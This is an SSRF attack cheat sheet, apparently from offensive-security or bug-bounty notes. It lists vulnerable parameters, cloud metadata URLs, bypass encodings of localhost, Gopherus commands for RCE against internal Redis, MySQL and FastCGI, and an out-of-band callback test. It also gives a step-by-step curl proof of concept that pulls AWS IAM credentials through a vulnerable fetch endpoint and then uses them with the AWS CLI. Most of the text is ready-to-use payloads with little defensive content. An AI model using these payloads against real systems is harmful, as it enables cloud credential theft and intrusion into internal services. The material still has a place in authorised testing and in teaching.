# SSRF — Server-Side Request Forgery

**CWE:** CWE-918 | **OWASP:** A10:2021

---

## Finding SSRF Parameters

```bash
# Common vulnerable parameters
url=, image=, link=, src=, dest=, proxy=, path=, host=,
fetch=, load=, callback=, redirect=, uri=, page=, data=

# Find in Wayback URLs
cat all_urls.txt | grep -iE "(url|image|link|src|dest|proxy|fetch|load)="

# Test with interactsh for OOB detection
interactsh-client
```

---

## Basic Payloads

```bash
# Cloud metadata
http://169.254.169.254/latest/meta-data/                    # AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/         # GCP
http://169.254.169.254/metadata/instance?api-version=2021   # Azure
http://100.100.100.200/latest/meta-data/                    # Alibaba

# Local services
http://localhost/admin
http://127.0.0.1:8080
http://0.0.0.0:6379        # Redis
http://127.0.0.1:27017     # MongoDB

# Filter bypass
http://[::1]/              # IPv6 localhost
http://0/
http://127.1/
http://2130706433/         # Decimal IP for 127.0.0.1
http://017700000001/       # Octal
http://0x7f000001/         # Hex

# DNS rebinding bypass
# Use: https://lock.cmpxchg8b.com/rebinder.html
```

---

## SSRF → RCE via Gopherus

```bash
# Gopherus generates gopher:// URLs for internal protocols
python3 gopherus.py --exploit redis       # Redis RCE
python3 gopherus.py --exploit mysql       # MySQL query execution
python3 gopherus.py --exploit memcache    # Memcached injection
python3 gopherus.py --exploit fastcgi     # FastCGI RCE
python3 gopherus.py --exploit smtp        # SMTP abuse
```

---

## Blind SSRF Detection

```bash
# Always use out-of-band detection for blind SSRF
interactsh-client

# Inject as SSRF payload
url=http://YOUR-INTERACTSH-URL.oast.fun

# If you receive a DNS/HTTP callback → Blind SSRF confirmed
```

---

## Cloud Credential Theft PoC

```bash
# AWS — get IAM credentials
curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Response: {"role": "ec2-role"}

curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role"
# Response: {"AccessKeyId":"...", "SecretAccessKey":"...", "Token":"..."}

# Use credentials
export AWS_ACCESS_KEY_ID="..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
aws s3 ls
aws iam get-user
```

---

## Severity

**Cloud credential theft** → Critical

**Internal service access leading to RCE** → Critical

**Internal admin panel access** → High

**Port scanning internal network** → High

**Blind SSRF (DNS callback only)** → Medium

**SSRF restricted to external IPs only** → Low
